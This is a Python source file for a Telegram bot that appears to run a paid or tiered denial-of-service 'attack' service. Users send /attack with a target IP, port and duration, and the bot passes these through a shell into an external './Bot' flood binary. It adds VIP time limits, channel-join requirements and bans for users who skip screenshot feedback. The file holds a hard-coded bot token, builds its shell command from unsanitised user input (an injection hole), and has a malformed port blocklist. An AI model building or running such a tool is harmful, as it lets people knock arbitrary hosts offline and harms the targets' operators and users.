import telebot
import subprocess
import time
import threading
from datetime import datetime

# ========== CONFIG ==========
bot = telebot.TeleBot('7619017682:AAEMrixQMT4UCzmREBm5nRCbiaJ7_dTuNEg')  # Replace with your bot token
ADMIN_ID = 6437994839 # Replace with your Telegram user ID
REQUIRED_CHANNELS = ['@Ritikxyz9', '@RitikEdu']
BLOCKED_PORTS = [{21, 22, 80, 443, 3306, 8700, 20000, 443, 17500, 9031, 20002, 20001}  # Add ports to blocklist

# ============================

# Global State
vip_users = set()
banned_users = {}  # user_id: ban_end_time
pending_feedback = {}  # user_id: {attack_end, feedback_deadline, target, port}
user_photo_hashes = {}  # user_id: set(file_ids)
active_attacks = {}  # user_id: attack_end_time
max_concurrent_attacks = 3  # default global limit

# ✅ Logger
def log_event(text):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("bot_log.txt", "a") as f:
        f.write(f"[{timestamp}] {text}\n")

# ✅ Check if user is in all required channels
def is_user_joined(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            status = bot.get_chat_member(chat_id=channel, user_id=user_id).status
            if status not in ['member', 'creator', 'administrator']:
                return False
        except:
            return False
    return True

# 🚀 ATTACK COMMAND
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    now = time.time()

    # Banned check
    if user_id in banned_users and banned_users[user_id] > now:
        remaining = int(banned_users[user_id] - now)
        bot.reply_to(message, f"🚫 *You're banned for not submitting feedback.*\nTry again in `{remaining}` seconds.", parse_mode='Markdown')
        return

    # Channel join check
    if not is_user_joined(user_id):
        bot.reply_to(message, f"❌ *You must join both channels before using this bot:*\n"
                   f"➡️ [Join Channel 1](https://t.me/Ritikxyz9)\n"
                   f"➡️ [Join Channel 2](https://t.me/RitikEdu)",  parse_mode="Markdown", disable_web_page_preview=True
                )
        return

    # Only normal users are restricted from multiple attacks
    if user_id not in vip_users and user_id in active_attacks and active_attacks[user_id] > now:
        remaining = int(active_attacks[user_id] - now)
        bot.reply_to(message, f"⏳ *You already have an active attack.*\nWait `{remaining}` seconds before starting another.", parse_mode='Markdown')
        return

    # Clean expired attacks
    for uid, end_time in list(active_attacks.items()):
        if time.time() >= end_time:
            del active_attacks[uid]

    # Max concurrent check
    if len(active_attacks) >= max_concurrent_attacks:
        bot.reply_to(message, "🚫 *Max concurrent attacks reached.* Try again later.", parse_mode='Markdown')
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "🧬 *Usage:* /attack <IP> <PORT> <TIME>", parse_mode='Markdown')
        return

    target, port, duration = command[1], command[2], command[3]

    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ *Error:* Port and Time must be numbers!", parse_mode='Markdown')
        return

    if port in BLOCKED_PORTS:
        bot.reply_to(message, f"🚫 *Port* `{port}` *is blocked and cannot be used.*", parse_mode='Markdown')
        return

    max_time = 240 if user_id in vip_users else 120
    original_duration = duration

    if duration > max_time:
        duration = max_time
        bot.reply_to(message, f"⚠️ You requested `{original_duration}s`, but your max limit is `{max_time}s`.\n*Attack will run for* `{max_time}s`.", parse_mode='Markdown')
    else:
        bot.reply_to(message,
                            f"*🔥 War Mode Activated!*\n" 
                            f"Target : `{target}:{port}`\n"
                            f"Time : `{duration}`Seconds\n"
                            f"💢Feedback Compulsory💢", parse_mode='Markdown')

    # Track feedback
    pending_feedback[user_id] = {
        "attack_end": now + duration,
        "feedback_deadline": now + duration + 300,
        "target": target,
        "port": port
    }

    # Track active attack
    active_attacks[user_id] = now + duration

    # Log start
    log_event(f"ATTACK STARTED by {user_id} on {target}:{port} for {duration}s")

    # Run attack
    full_command = f"./Bot {target} {port} {duration} 900"
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ *Error running attack:* `{e}`", parse_mode='Markdown')
        return

    bot.send_message(message.chat.id, 
                            f"🧊 *Battle Won!*\n"
                            f"Target:`{target}:{port}`\n"
                            f"Time : `{duration}`\n"
                            f"🔹You can now start another attack🔹", parse_mode='Markdown')
    log_event(f"ATTACK FINISHED by {user_id} on {target}:{port}")

# 📸 FEEDBACK PHOTO HANDLER
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    now = time.time()

    if user_id not in pending_feedback:
        return

    file_id = message.photo[-1].file_id
    if user_id not in user_photo_hashes:
        user_photo_hashes[user_id] = set()

    if file_id in user_photo_hashes[user_id]:
        bot.reply_to(message, "⚠️ *This photo has already been submitted.* Please send a new screenshot.", parse_mode='Markdown')
        log_event(f"DUPLICATE FEEDBACK from {user_id} rejected")
        return

    feedback_window = pending_feedback[user_id]
    if now <= feedback_window["feedback_deadline"]:
        user_photo_hashes[user_id].add(file_id)
        del pending_feedback[user_id]
        bot.reply_to(message, "✅ *Feedback received.* You're good to go!", parse_mode='Markdown')
        log_event(f"FEEDBACK RECEIVED from {user_id}")
    else:
        bot.reply_to(message, "⏰ *Too late!* Feedback window expired.", parse_mode='Markdown')

# 🧠 FEEDBACK WATCHER THREAD
def feedback_watcher():
    while True:
        now = time.time()

        # Auto unban
        for user_id, ban_end in list(banned_users.items()):
            if now >= ban_end:
                del banned_users[user_id]
                try:
                    bot.send_message(user_id, "✅ *Your 30-minute ban has expired.* You can now use `/attack` again.", parse_mode='Markdown')
                except:
                    pass
                log_event(f"USER UNBANNED: {user_id}")

        # Ban users with no feedback
        for user_id, data in list(pending_feedback.items()):
            if now > data["feedback_deadline"]:
                banned_users[user_id] = now + 1800
                del pending_feedback[user_id]
                try:
                    bot.send_message(user_id, f"🚫 *You were banned for 30 minutes for not sending feedback after attacking* `{data['target']}:{data['port']}`.", parse_mode='Markdown')
                except:
                    pass
                log_event(f"USER BANNED: {user_id} (No feedback after attack on {data['target']}:{data['port']})")

        time.sleep(10)

# 🔧 ADMIN: /vipuser <user_id>
@bot.message_handler(commands=['vipuser'])
def add_vip_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ *Usage:* `/vipuser <user_id>`", parse_mode='Markdown')
        return
    user_id = int(args[1])
    vip_users.add(user_id)
    bot.reply_to(message, f"✨ *User* `{user_id}` *is now a VIP!*", parse_mode='Markdown')
    log_event(f"VIP ADDED by admin: {user_id} is now VIP")

# 🔧 ADMIN: /setmax <num>
@bot.message_handler(commands=['setmax'])
def set_max_concurrent(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ *Usage:* `/setmax <number>`", parse_mode='Markdown')
        return
    global max_concurrent_attacks
    max_concurrent_attacks = int(args[1])
    bot.reply_to(message, f"✅ *Max concurrent attacks set to* `{max_concurrent_attacks}`", parse_mode='Markdown')
    log_event(f"ADMIN SET max concurrent attacks to {max_concurrent_attacks}")

# ✅ /help for everyone
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "*📘 Help Menu:*\n"
        "➤ `/attack <IP> <PORT> <TIME>` - Start an attack\n"
        "➤ Max time:\n    - 120s for normal users\n    - 240s for VIPs\n"
        "➤ Must join required channels\n"
        "➤ Feedback photo is *mandatory* after attack\n"
        "➤ Failure to send feedback = *30 min ban*\n"
        "➤ Admin Commands:\n"
        "    `/vipuser <user_id>`\n"
        "    `/setmax <number>`\n"
        "    `/broadcast <message>`"
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

# ✅ /broadcast for admin
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.from_user.id != ADMIN_ID:
        return

    content = message.text[len("/broadcast"):].strip()
    if not content:
        bot.reply_to(message, "⚠️ *Usage:* `/broadcast <message>`", parse_mode='Markdown')
        return

    sent_count = 0
    failed_count = 0

    user_ids = set(vip_users) | set(banned_users) | set(pending_feedback) | set(active_attacks)
    user_ids.add(ADMIN_ID)

    for uid in user_ids:
        try:
            bot.send_message(uid, f"📢 *Broadcast:*\n{content}", parse_mode='Markdown')
            sent_count += 1
        except:
            failed_count += 1

    bot.reply_to(message, f"✅ *Broadcast sent to* `{sent_count}` users.\n❌ Failed: `{failed_count}`", parse_mode='Markdown')
    log_event(f"BROADCAST by admin: \"{content}\" — Sent: {sent_count}, Failed: {failed_count}")

# /start
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "*🚀 Welcome to the Attack Bot!*\nUse `/attack <IP> <PORT> <TIME>` to start\n /help For All Commands", parse_mode='Markdown')

# Start background threads
threading.Thread(target=feedback_watcher, daemon=True).start()

# Start bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
